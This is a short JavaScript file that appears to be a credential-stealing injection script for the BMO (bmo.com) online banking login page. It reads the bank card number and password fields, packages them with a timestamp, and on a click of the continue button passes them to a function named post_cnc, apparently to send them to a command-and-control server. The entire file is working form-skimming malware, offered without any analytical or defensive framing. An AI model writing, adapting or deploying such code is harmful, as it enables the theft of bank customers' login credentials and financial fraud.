function get_user(){
	try {
		return document.getElementById('siBankCard').value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_pass(){
	try {
		return document.getElementById('regSignInPassword').value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_user_pass(){
	try {
		let data = {
			"auth":{
				site: "bmo.com",
				user: get_user(),
				pass: get_pass(),
				timestamp: Date.now()
			}
		};
		return data;
	} catch(error){
		console.log(error);
		return false;
	}
}

document.getElementById('btnBankCardContinue').addEventListener(
	'click',
	function(){
		try {
			post_cnc(
				get_user_pass(),
				function(data){
					console.log(data);
					return true;
				}
			);
			return true;
		} catch(error){
			console.log(error);
			return false;
		}
	}
);
